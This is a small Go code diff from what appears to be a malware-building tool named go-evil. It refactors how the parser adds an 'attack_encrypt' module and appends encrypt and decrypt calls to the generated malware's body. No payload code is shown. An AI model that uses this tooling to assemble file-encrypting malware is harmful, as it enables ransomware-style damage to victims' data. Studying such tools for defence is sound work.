@@ -6,7 +6,6 @@ import (
 
 	"github.com/s9rA16Bf4/go-evil/utility/contains"
 	"github.com/s9rA16Bf4/go-evil/utility/error"
-	"github.com/s9rA16Bf4/go-evil/utility/io"
 	"github.com/s9rA16Bf4/go-evil/utility/json"
 )
 
@@ -61,10 +60,10 @@ func Parse(base_64_serialize_json string) string {
 				case "hash":
 					Hash(value)
 				case "encrypt":
-					data_structure = json.Receive(io.Append_domain("attack_encrypt", json.Send(data_structure)))
+					data_structure.Append_imported_domain("attack_encrypt")
 					data_structure.Append_malware_gut("attack_encrypt.Encrypt()")
 				case "decrypt":
-					data_structure = json.Receive(io.Append_domain("attack_encrypt", json.Send(data_structure)))
+					data_structure.Append_imported_domain("attack_encrypt")
 					data_structure.Append_malware_gut("attack_encrypt.Decrypt()")
 				default:
 					error.Function_error(function, "attack_vector.Parse()")
